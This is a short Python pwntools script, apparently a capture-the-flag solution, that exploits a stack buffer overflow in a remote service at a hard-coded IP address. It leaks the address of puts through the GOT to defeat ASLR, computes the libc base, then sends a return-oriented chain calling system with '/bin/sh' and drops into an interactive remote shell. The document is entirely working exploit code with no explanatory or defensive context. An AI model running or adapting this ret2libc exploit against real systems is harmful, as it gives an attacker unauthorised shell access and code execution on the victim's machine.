from pwn import *
binsh = 1799594
system = 349200
pop_rdi = 0x401253
ret = 0x401254
main = 0x40117a
puts = 0x401060
puts_got = 0x404018
puts_libc = 554400


r = remote("204.48.21.6", 9999)

payload = b'a' * 40
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts)
payload += p64(main)

r.recvuntil(b'Got libc?')
r.sendline(payload)
r.recvline()
libc = int.from_bytes(r.recvline()[:8].strip(), byteorder='little') - puts_libc

payload = b'a' * 40
payload += p64(pop_rdi) + p64(binsh + libc) + p64(ret)
payload += p64(system + libc)
payload += p64(main)

r.recvuntil(b'Got libc?')
r.sendline(payload)
print(r.recvline())
r.interactive()